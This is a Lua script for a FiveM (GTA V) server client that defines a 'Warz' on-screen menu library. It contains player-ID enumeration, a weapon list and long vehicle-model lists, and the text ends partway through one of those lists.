Warz = {}

Warz.debug = false

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 0

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

local menus = {}
local keys = {up = 172, down = 173, left = 174, right = 175, select = 176, back = 177}
local optionCount = 0

local currentKey = nil
local currentMenu = nil

local menuWidth = 0.30
local titleHeight = 0.11
local titleYOffset = 0.03
local titleScale = 1.0

local buttonHeight = 0.038
local buttonFont = 0
local buttonScale = 0.365
local buttonTextXOffset = 0.005
local buttonTextYOffset = 0.005

local function debugPrint(text)
	if Warz.debug then
		Citizen.Trace("[NMmenu] " .. tostring(text))
	end
end

local function setMenuProperty(id, property, value)
	if id and menus[id] then
		menus[id][property] = value
		debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
	end
end

local function isMenuVisible(id)
	if id and menus[id] then
		return menus[id].visible
	else
		return false
	end
end

local function setMenuVisible(id, visible, holdCurrent)
	if id and menus[id] then
		setMenuProperty(id, "visible", visible)

		if not holdCurrent and menus[id] then
			setMenuProperty(id, "currentOption", 1)
		end

		if visible then
			if id ~= currentMenu and isMenuVisible(currentMenu) then
				setMenuVisible(currentMenu, false)
			end

			currentMenu = id
		end
	end
end

local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	SetTextColour(color.r, color.g, color.b, color.a)
	SetTextFont(font)
	SetTextScale(scale, scale)

	if shadow then
		SetTextDropShadow(2, 2, 0, 0, 0)
	end

	if menus[currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menuWidth - buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end
	SetTextEntry("STRING")
	AddTextComponentString(text)
	DrawText(x, y)
end

local function drawRect(x, y, width, height, color)
	DrawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

local function drawTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight / 2

		if menus[currentMenu].titleBackgroundSprite then
			DrawSprite(
				menus[currentMenu].titleBackgroundSprite.dict,
				menus[currentMenu].titleBackgroundSprite.name,
				x,
				y,
				menuWidth,
				titleHeight,
				0.,
				255,
				255,
				255,
				255
			)
		else
			drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(
			menus[currentMenu].title,
			x,
			y - titleHeight / 2 + titleYOffset,
			menus[currentMenu].titleFont,
			menus[currentMenu].titleColor,
			titleScale,
			true
		)
	end
end

local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		local subTitleColor = {
			r = menus[currentMenu].titleBackgroundColor.r,
			g = menus[currentMenu].titleBackgroundColor.g,
			b = menus[currentMenu].titleBackgroundColor.b,
			a = 255
		}

		drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawText(
			menus[currentMenu].subTitle,
			menus[currentMenu].x + buttonTextXOffset,
			y - buttonHeight / 2 + buttonTextYOffset,
			buttonFont,
			subTitleColor,
			buttonScale,
			false
		)

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menuWidth,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTitleColor,
				buttonScale,
				false,
				false,
				true
			)
		end
	end
end

local function drawButton(text, subText)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil

	if
		menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].maxOptionCount
	 then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)
		drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
		)

		if subText then
			drawText(
				subText,
				menus[currentMenu].x + buttonTextXOffset,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTextColor,
				buttonScale,
				false,
				shadow,
				true
			)
		end
	end
end

function Warz.CreateMenu(id, title)

	menus[id] = {}
	menus[id].title = title
	menus[id].subTitle = "INTERACTION MENU"

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.68
	menus[id].y = 0.19

	menus[id].currentOption = 1
	menus[id].maxOptionCount = 11
	menus[id].titleFont = 2
	menus[id].titleColor = {r = 255, g = 255, b = 255, a = 255}
	Citizen.CreateThread(
		function()
			while true do
				Citizen.Wait(0)
				local ra = RGBRainbow(1.0)				
				menus[id].titleBackgroundColor = {r = 0, g = 0, b = 0, a = 200}
				menus[id].menuFocusBackgroundColor = {r = 255, g = 255, b = 255, a = 100}
			end
		end)
	menus[id].titleBackgroundSprite = nil

	menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}
	menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
	--menus[id].menuFocusBackgroundColor = { r = 245, g = 245, b = 245, a = 255 }
	menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 100}

	menus[id].subTitleBackgroundColor = {r = 77, g = 0, b = 77, a = 255}

	menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"} 

	debugPrint(tostring(id) .. " menu created")
end

function Warz.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		Warz.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, "subTitle", string.upper(subTitle))
		else
			setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
		end

		setMenuProperty(id, "previousMenu", parent)

		setMenuProperty(id, "x", menus[parent].x)
		setMenuProperty(id, "y", menus[parent].y)
		setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
		setMenuProperty(id, "titleFont", menus[parent].titleFont)
		setMenuProperty(id, "titleColor", menus[parent].titleColor)
		setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
		setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
		setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
		setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
		setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
		setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
		setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
	else
		debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
	end
end

function Warz.CurrentMenu()
	return currentMenu
end

function Warz.OpenMenu(id)
	if id and menus[id] then
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
		setMenuVisible(id, true)

		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
				Citizen.Wait(0)
			end
		end

		debugPrint(tostring(id) .. " menu opened")
	else
		debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
	end
end

function Warz.IsMenuOpened(id)
	return isMenuVisible(id)
end

function Warz.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then
			return true
		end
	end

	return false
end

function Warz.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end

function Warz.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			debugPrint(tostring(currentMenu) .. " menu closed")
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
			debugPrint(tostring(currentMenu) .. " menu about to be closed")
		end
	end
end

function Warz.Button(text, subText)
	local buttonText = text
	if subText then
		buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
	end

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText .. " button pressed")
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")

		return false
	end
end
local dEI = "1"
local azezaezeazdqsdqs = false
function Warz.MenuButton(text, id)
	if menus[id] then
		if Warz.Button(text) then
			setMenuVisible(currentMenu, false)
			setMenuVisible(id, true, true)

			return true
		end
	else
		debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
	end

	return false
end

function Warz.CheckBox(text, bool, callback)
	local checked = "~p~~h~Off"
	if bool then
		checked = "~g~~h~On"
	end

	if Warz.Button(text, checked) then
		bool = not bool
		debugPrint(tostring(text) .. " checkbox changed to " .. tostring(bool))
		callback(bool)

		return true
	end

	return false
end

function Warz.ComboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = "← " .. tostring(selectedItem) .. " →"
	end

	if Warz.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
			if currentIndex > 1 then
				currentIndex = currentIndex - 1
			else
				currentIndex = itemsCount
			end
		elseif currentKey == keys.right then
			if currentIndex < itemsCount then
				currentIndex = currentIndex + 1
			else
				currentIndex = 1
			end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
	return false
end

function Warz.Display()
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			Warz.CloseMenu()
		else
			ClearAllHelpMessages()

			drawTitle()
			drawSubTitle()

			currentKey = nil

			if IsDisabledControlJustPressed(0, keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true)
				else
					Warz.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end

function Warz.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function Warz.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function Warz.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function Warz.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function Warz.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function Warz.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"titleBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
	)
end

function Warz.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function Warz.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function Warz.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
	)
end

function Warz.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function Warz.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function Warz.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function Warz.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
	AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = true

	while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
		Citizen.Wait(0)
	end

	if UpdateOnscreenKeyboard() ~= 2 then
		local result = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		blockinput = false
		return result
	else
		Citizen.Wait(500)
		blockinput = false
		return nil
	end
end

local function getPlayerIds()
	local players = {}
	for i = 0, GetNumberOfPlayers(128) do
		if NetworkIsPlayerActive(i) then
			players[#players + 1] = i
		end
	end
	return players
end


function DrawText3D(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

function drawNotification(text)
	SetNotificationTextEntry("STRING")
	AddTextComponentString(text)
	DrawNotification(false, false)
end



local allWeapons = {
	"WEAPON_KNIFE",
	"WEAPON_KNUCKLE",
	"WEAPON_NIGHTSTICK",
	"WEAPON_HAMMER",
	"WEAPON_BAT",
	"WEAPON_GOLFCLUB",
	"WEAPON_CROWBAR",
	"WEAPON_BOTTLE",
	"WEAPON_DAGGER",
	"WEAPON_HATCHET",
	"WEAPON_MACHETE",
	"WEAPON_FLASHLIGHT",
	"WEAPON_SWITCHBLADE",
	"WEAPON_PISTOL",
	"WEAPON_PISTOL_MK2",
	"WEAPON_COMBATPISTOL",
	"WEAPON_APPISTOL",
	"WEAPON_PISTOL50",
	"WEAPON_SNSPISTOL",
	"WEAPON_HEAVYPISTOL",
	"WEAPON_VINTAGEPISTOL",
	"WEAPON_STUNGUN",
	"WEAPON_FLAREGUN",
	"WEAPON_MARKSMANPISTOL",
	"WEAPON_REVOLVER",
	"WEAPON_MICROSMG",
	"WEAPON_SMG",
	"WEAPON_SMG_MK2",
	"WEAPON_ASSAULTSMG",
	"WEAPON_MG",
	"WEAPON_COMBATMG",
	"WEAPON_COMBATMG_MK2",
	"WEAPON_COMBATPDW",
	"WEAPON_GUSENBERG",
	"WEAPON_MACHINEPISTOL",
	"WEAPON_ASSAULTRIFLE",
	"WEAPON_ASSAULTRIFLE_MK2",
	"WEAPON_CARBINERIFLE",
	"WEAPON_CARBINERIFLE_MK2",
	"WEAPON_ADVANCEDRIFLE",
	"WEAPON_SPECIALCARBINE",
	"WEAPON_BULLPUPRIFLE",
	"WEAPON_COMPACTRIFLE",
	"WEAPON_PUMPSHOTGUN",
	"WEAPON_SAWNOFFSHOTGUN",
	"WEAPON_BULLPUPSHOTGUN",
	"WEAPON_ASSAULTSHOTGUN",
	"WEAPON_MUSKET",
	"WEAPON_HEAVYSHOTGUN",
	"WEAPON_DBSHOTGUN",
	"WEAPON_SNIPERRIFLE",
	"WEAPON_HEAVYSNIPER",
	"WEAPON_HEAVYSNIPER_MK2",
	"WEAPON_MARKSMANRIFLE",
	"WEAPON_GRENADELAUNCHER",
	"WEAPON_GRENADELAUNCHER_SMOKE",
	"WEAPON_RPG",
	"WEAPON_STINGER",
	"WEAPON_FIREWORK",
	"WEAPON_HOMINGLAUNCHER",
	"WEAPON_GRENADE",
	"WEAPON_STICKYBOMB",
	"WEAPON_PROXMINE",
	"WEAPON_BZGAS",
	"WEAPON_SMOKEGRENADE",
	"WEAPON_MOLOTOV",
	"WEAPON_FIREEXTINGUISHER",
	"WEAPON_PETROLCAN",
	"WEAPON_SNOWBALL",
	"WEAPON_FLARE",
	"WEAPON_BALL"
}
local aH = {
    'Dinghy',
    'Dinghy2',
    'Dinghy3',
    'Dingh4',
    'Jetmax',
    'Marquis',
    'Seashark',
    'Seashark2',
    'Seashark3',
    'Speeder',
    'Speeder2',
    'Squalo',
    'Submersible',
    'Submersible2',
    'Suntrap',
    'Toro',
    'Toro2',
    'Tropic',
    'Tropic2',
    'Tug'
}
local aI = {
    'Benson',
    'Biff',
    'Cerberus',
    'Cerberus2',
    'Cerberus3',
    'Hauler',
    'Hauler2',
    'Mule',
    'Mule2',
    'Mule3',
    'Mule4',
    'Packer',
    'Phantom',
    'Phantom2',
    'Phantom3',
    'Pounder',
    'Pounder2',
    'Stockade',
    'Stockade3',
    'Terbyte'
}
local aJ = {
    'Blista',
    'Blista2',
    'Blista3',
    'Brioso',
    'Dilettante',
    'Dilettante2',
    'Issi2',
    'Issi3',
    'issi4',
    'Iss5',
    'issi6',
    'Panto',
    'Prarire',
    'Rhapsody'
}
local aK = {
    'CogCabrio',
    'Exemplar',
    'F620',
    'Felon',
    'Felon2',
    'Jackal',
    'Oracle',
    'Oracle2',
    'Sentinel',
    'Sentinel2',
    'Windsor',
    'Windsor2',
    'Zion',
    'Zion2'
}
local aL = {
    'Bmx',
    'Cruiser',
    'Fixter',
    'Scorcher',
    'Tribike',
    'Tribike2',
    'tribike3'
}
local aM = {
    'ambulance',
    'FBI',
    'FBI2',
    'FireTruk',
    'PBus',
    'police',
    'Police2',
    'Police3',
    'Police4',
    'PoliceOld1',
    'PoliceOld2',
    'PoliceT',
    'Policeb',
    'Polmav',
    'Pranger',
    'Predator',
    'Riot',
    'Riot2',
    'Sheriff',
    'Sheriff2'
}
local aN = {
    'Akula',
    'Annihilator',
    'Buzzard',
    'Buzzard2',
    'Cargobob',
    'Cargobob2',
    'Cargobob3',
    'Cargobob4',
    'Frogger',
    'Frogger2',
    'Havok',
    'Hunter',
    'Maverick',
    'Savage',
    'Seasparrow',
    'Skylift',
    'Supervolito',
    'Supervolito2',
    'Swift',
    'Swift2',
    'Valkyrie',
    'Valkyrie2',
    'Volatus'
}
local aO = {
    'Bulldozer',
    'Cutter',
    'Dump',
    'Flatbed',
    'Guardian',
    'Handler',
    'Mixer',
    'Mixer2',
    'Rubble',
    'Tiptruck',
    'Tiptruck2'
}
local aP = {
    'APC',
    'Barracks',
    'Barracks2',
    'Barracks3',
    'Barrage',
    'Chernobog',
    'Crusader',
    'Halftrack',
    'Khanjali',
    'Rhino',
    'Scarab',
    'Scarab2',
    'Scarab3',
    'Thruster',
    'Trailersmall2'
}
local aQ = {
    'Akuma',
    'Avarus',
    'Bagger',
    'Bati2',
    'Bati',
    'BF400',
    'Blazer4',
    'CarbonRS',
    'Chimera',
    'Cliffhanger',
    'Daemon',
    'Daemon2',
    'Defiler',
    'Deathbike',
    'Deathbike2',
    'Deathbike3',
    'Diablous',
    'Diablous2',
    'Double',
    'Enduro',
    'esskey',
    'Faggio2',
    'Faggio3',
    'Faggio',
    'Fcr2',
    'fcr',
    'gargoyle',
    'hakuchou2',
    'hakuchou',
    'hexer',
    'innovation',
    'Lectro',
    'Manchez',
    'Nemesis',
    'Nightblade',
    'Oppressor',
    'Oppressor2',
    'PCJ',
    'Ratbike',
    'Ruffian',
    'Sanchez2',
    'Sanchez',
    'Sanctus',
    'Shotaro',
    'Sovereign',
    'Thrust',
    'Vader',
    'Vindicator',
    'Vortex',
    'Wolfsbane',
    'zombiea',
    'zombieb'
}
local aR = {
    'Blade',
    'Buccaneer',
    'Buccaneer2',
    'Chino',
    'Chino2',
    'clique',
    'Deviant',
    'Dominator',
    'Dominator2',
    'Dominator3',
    'Dominator4',
    'Dominator5',
    'Dominator6',
    'Dukes',
    'Dukes2',
    'Ellie',
    'Faction',
    'faction2',
    'faction3',
    'Gauntlet',
    'Gauntlet2',
    'Hermes',
    'Hotknife',
    'Hustler',
    'Impaler',
    'Impaler2',
    'Impaler3',
    'Impaler4',
    'Imperator',
    'Imperator2',
    'Imperator3',
    'Lurcher',
    'Moonbeam',
    'Moonbeam2',
    'Nightshade',
    'Phoenix',
    'Picador',
    'RatLoader',
    'RatLoader2',
    'Ruiner',
    'Ruiner2',
    'Ruiner3',
    'SabreGT',
    'SabreGT2',
    'Sadler2',
    'Slamvan',
    'Slamvan2',
    'Slamvan3',
    'Slamvan4',
    'Slamvan5',
    'Slamvan6',
    'Stalion',
    'Stalion2',
    'Tampa',
    'Tampa3',
    'Tulip',
    'Vamos,',
    'Vigero',
    'Virgo',
    'Virgo2',
    'Virgo3',
    'Voodoo',
    'Voodoo2',
    'Yosemite'
}
local aS = {
    'BFinjection',
    'Bifta',
    'Blazer',
    'Blazer2',
    'Blazer3',
    'Blazer5',
    'Bohdi',
    'Brawler',
    'Bruiser',
    'Bruiser2',
    'Bruiser3',
    'Caracara',
    'DLoader',
    'Dune',
    'Dune2',
    'Dune3',
    'Dune4',
    'Dune5',
    'Insurgent',
    'Insurgent2',
    'Insurgent3',
    'Kalahari',
    'Kamacho',
    'LGuard',
    'Marshall',
    'Mesa',
    'Mesa2',
    'Mesa3',
    'Monster',
    'Monster4',
    'Monster5',
    'Nightshark',
    'RancherXL',
    'RancherXL2',
    'Rebel',
    'Rebel2',
    'RCBandito',
    'Riata',
    'Sandking',
    'Sandking2',
    'Technical',
    'Technical2',
    'Technical3',
    'TrophyTruck',
    'TrophyTruck2',
    'Freecrawler',
    'Menacer'
}
local aT = {
    'AlphaZ1',
    'Avenger',
    'Avenger2',
    'Besra',
    'Blimp',
    'blimp2',
    'Blimp3',
    'Bombushka',
    'Cargoplane',
    'Cuban800',
    'Dodo',
    'Duster',
    'Howard',
    'Hydra',
    'Jet',
    'Lazer',
    'Luxor',
    'Luxor2',
    'Mammatus',
    'Microlight',
    'Miljet',
    'Mogul',
    'Molotok',
    'Nimbus',
    'Nokota',
    'Pyro',
    'Rogue',
    'Seabreeze',
    'Shamal',
    'Starling',
    'Stunt',
    'Titan',
    'Tula',
    'Velum',
    'Velum2',
    'Vestra',
    'Volatol',
    'Striekforce'
}
local aU = {
    'BJXL',
    'Baller',
    'Baller2',
    'Baller3',
    'Baller4',
    'Baller5',
    'Baller6',
    'Cavalcade',
    'Cavalcade2',
    'Dubsta',
    'Dubsta2',
    'Dubsta3',
    'FQ2',
    'Granger',
    'Gresley',
    'Habanero',
    'Huntley',
    'Landstalker',
    'patriot',
    'Patriot2',
    'Radi',
    'Rocoto',
    'Seminole',
    'Serrano',
    'Toros',
    'XLS',
    'XLS2'
}
local aV = {
    'Asea',
    'Asea2',
    'Asterope',
    'Cog55',
    'Cogg552',
    'Cognoscenti',
    'Cognoscenti2',
    'emperor',
    'emperor2',
    'emperor3',
    'Fugitive',
    'Glendale',
    'ingot',
    'intruder',
    'limo2',
    'premier',
    'primo',
    'primo2',
    'regina',
    'romero',
    'stafford',
    'Stanier',
    'stratum',
    'stretch',
    'surge',
    'tailgater',
    'warrener',
    'Washington'
}
local aW = {
    'Airbus',
    'Brickade',
    'Bus',
    'Coach',
    'Rallytruck',
    'Rentalbus',
    'taxi',
    'Tourbus',
    'Trash',
    'Trash2',
    'WastIndr',
    'PBus2'
}
local aX = {
    'Alpha',
    'Banshee',
    'Banshee2',
    'BestiaGTS',
    'Buffalo',
    'Buffalo2',
    'Buffalo3',
    'Carbonizzare',
    'Comet2',
    'Comet3',
    'Comet4',
    'Comet5',
    'Coquette',
    'Deveste',
    'Elegy',
    'Elegy2',
    'Feltzer2',
    'Feltzer3',
    'FlashGT',
    'Furoregt',
    'Fusilade',
    'Futo',
    'GB200',
    'Hotring',
    'Infernus2',
    'Italigto',
    'Jester',
    'Jester2',
    'Khamelion',
    'Kurama',
    'Kurama2',
    'Lynx',
    'MAssacro',
    'MAssacro2',
    'neon',
    'Ninef',
    'ninfe2',
    'omnis',
    'Pariah',
    'Penumbra',
    'Raiden',
    'RapidGT',
    'RapidGT2',
    'Raptor',
    'Revolter',
    'Ruston',
    'Schafter2',
    'Schafter3',
    'Schafter4',
    'Schafter5',
    'Schafter6',
    'Schlagen',
    'Schwarzer',
    'Sentinel3',
    'Seven70',
    'Specter',
    'Specter2',
    'Streiter',
    'Sultan',
    'Surano',
    'Tampa2',
    'Tropos',
    'Verlierer2',
    'ZR380',
    'ZR3802',
    'ZR3803'
}
local aY = {
    'Ardent',
    'BType',
    'BType2',
    'BType3',
    'Casco',
    'Cheetah2',
    'Cheburek',
    'Coquette2',
    'Coquette3',
    'Deluxo',
    'Fagaloa',
    'Gt500',
    'JB700',
    'JEster3',
    'MAmba',
    'Manana',
    'Michelli',
    'Monroe',
    'Peyote',
    'Pigalle',
    'RapidGT3',
    'Retinue',
    'Savastra',
    'Stinger',
    'Stingergt',
    'Stromberg',
    'Swinger',
    'Torero',
    'Tornado',
    'Tornado2',
    'Tornado3',
    'Tornado4',
    'Tornado5',
    'Tornado6',
    'Viseris',
    'Z190',
    'ZType'
}
local aZ = {
    'Adder',
    'Autarch',
    'Bullet',
    'Cheetah',
    'Cyclone',
    'EntityXF',
    'Entity2',
    'FMJ',
    'GP1',
    'Infernus',
    'LE7B',
    'Nero',
    'Nero2',
    'Osiris',
    'Penetrator',
    'PFister811',
    'Prototipo',
    'Reaper',
    'SC1',
    'Scramjet',
    'Sheava',
    'SultanRS',
    'Superd',
    'T20',
    'Taipan',
    'Tempesta',
    'Tezeract',
    'Turismo2',
    'Turismor',
    'Tyrant',
    'Tyrus',
    'Vacca',
    'Vagner',
    'Vigilante',
    'Visione',
    'Voltic',
    'Voltic2',
    'Zentorno',
    'Italigtb',
    'Italigtb2',
    'XA21'
}
local a_ = {
    'ArmyTanker',
    'ArmyTrailer',
    'ArmyTrailer2',
    'BaleTrailer',
    'BoatTrailer',
    'CableCar',
    'DockTrailer',
    'Graintrailer',
    'Proptrailer',
    'Raketailer',
    'TR2',
    'TR3',
    'TR4',
    'TRFlat',
    'TVTrailer',
    'Tanker',
    'Tanker2',
    'Trailerlogs',
    'Trailersmall',
    'Trailers',
    'Trailers2',
    'Trailers3'
}
local b0 = {
    'Freight',
    'Freightcar',
    'Freightcont1',
    'Freightcont2',
    'Freightgrain',
    'Freighttrailer',
    'TankerCar'
}
local b1 = {
    'Airtug',
    'Caddy',
    'Caddy2',
    'Caddy3',
    'Docktug',
    'Forklift',
    'Mower',
    'Ripley',
    'Sadler',
    'Scrap',
    'TowTruck',
    'Towtruck2',
    'Tractor',
    'Tractor2',
    'Tractor3',
    'TrailerLArge2',
    'Utilitruck',
    'Utilitruck3',
    'Utilitruck2'
}
local b2 = {
    'Bison',
    'Bison2',
    'Bison3',
    'BobcatXL',
    'Boxville',
    'Boxville2',
    'Boxville3',
    'Boxville4',
    'Boxville5',
